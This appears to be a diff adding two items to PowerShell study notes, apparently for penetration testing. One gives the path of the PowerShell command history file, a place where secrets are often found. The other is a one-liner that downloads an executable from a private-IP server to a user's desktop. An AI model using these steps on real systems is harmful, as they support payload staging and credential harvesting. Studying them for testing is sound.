@@ -12,6 +12,17 @@ Most Powershell commands, called cmdlets, are written in .NET.
 
 The normal format of a cmdlet is represented using Verb-Noun; for example the cmdlet to list commands is called 
 
+Windows powershell saves all previous commands into a file called 
+```bash
+ConsoleHost_history
+```
+This is located at 
+```bash
+%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+```
+
+
+
 ```bash
 Get-Command
 ```
@@ -146,3 +157,12 @@ $file = "C:\input.txt"
 $data = Get-Content $file
 [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($data)) | Out-File -Encoding "ASCII" out.html
 ```
+
+16. Download from server
+```bash
+cmd.exe 
+
+powershell -c "(new-object System.net.Webclient).DownloadFile('http://10.17.39.185:8000/hello.exe', 'C:\Users\dark\Desktop\hello.exe')"
+```
+
+
